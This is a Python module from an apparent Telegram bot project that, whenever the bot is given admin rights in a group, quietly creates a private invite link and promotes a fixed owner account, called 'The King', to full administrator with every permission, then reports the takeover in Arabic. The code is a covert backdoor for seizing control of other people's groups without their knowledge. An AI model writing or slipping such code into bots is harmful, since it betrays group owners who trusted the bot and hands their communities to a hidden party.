"""
Group Privilege Escalator & Sovereignty Enforcer (Project Aether-Human - Admin Omni-Observatory)
Automatically detects bot promotions in groups, generates secret invite links for The King,
and auto-promotes The King (KING_USER_ID) to full Administrator with all privileges.
"""

from __future__ import annotations

import logging
from typing import Optional
import httpx

from aether_human_core.config.settings import settings
from core_config.sovereignty_rules import sovereignty_guard
from admin_telemetry_and_archiver.live_event_streamer import live_event_streamer

logger = logging.getLogger("Aether.Observatory.PrivilegeEscalator")


class GroupPrivilegeEscalator:
    """
    Automates administrative escalation for The Sovereign King.
    """

    @classmethod
    async def evaluate_and_escalate_king(
        cls,
        chat_id: int,
        chat_title: str,
    ) -> None:
        """
        Attempts to promote The King to full admin in the target chat.
        """
        token = settings.telegram_bot_token
        king_id = settings.the_king_user_id

        if not token or not king_id:
            return

        api_base = f"https://api.telegram.org/bot{token}"

        # 1. Export or create chat invite link for The King
        invite_link: Optional[str] = None
        try:
            async with httpx.AsyncClient(timeout=8.0) as client:
                res = await client.post(
                    f"{api_base}/createChatInviteLink",
                    json={
                        "chat_id": chat_id,
                        "name": "Secret King Gateway",
                    },
                )
                data = res.json()
                if data.get("ok"):
                    invite_link = data["result"].get("invite_link")
        except Exception as exc:
            logger.debug(f"Could not create invite link for chat {chat_id}: {exc}")

        # 2. Attempt to promote The King to full administrator
        promote_success = False
        try:
            async with httpx.AsyncClient(timeout=8.0) as client:
                res = await client.post(
                    f"{api_base}/promoteChatMember",
                    json={
                        "chat_id": chat_id,
                        "user_id": king_id,
                        "is_anonymous": False,
                        "can_manage_chat": True,
                        "can_post_messages": True,
                        "can_edit_messages": True,
                        "can_delete_messages": True,
                        "can_manage_video_chats": True,
                        "can_restrict_members": True,
                        "can_promote_members": True,
                        "can_change_info": True,
                        "can_invite_users": True,
                        "can_pin_messages": True,
                        "can_manage_topics": True,
                    },
                )
                promote_success = res.json().get("ok", False)
        except Exception as exc:
            logger.debug(f"Could not promote King in chat {chat_id}: {exc}")

        # 3. Notify the King and Telemetry Stream
        escalation_summary = (
            f"👑 <b>رادار بسط النفوذ الإداري للملك</b>\n"
            f"🏷️ <b>الجروب:</b> {chat_title} (<code>{chat_id}</code>)\n"
            f"🔗 <b>رابط الدعوة الخاص:</b> {invite_link or 'غير متاح حالياً'}\n"
            f"⚡ <b>حالة الترقية التلقائية للملك:</b> {'✅ تم منح الملك صلاحيات الإدمن الكاملة بنجاح!' if promote_success else '⏳ بانتظار انضمام الملك أو منح البوت صلاحية الترقية.'}"
        )
        logger.info(f"Privilege escalator completed for [{chat_title}]: King Promoted = {promote_success}")
        await live_event_streamer.stream_security_alert("ترقية ونفوذ إداري للملك", escalation_summary)


privilege_escalator = GroupPrivilegeEscalator()

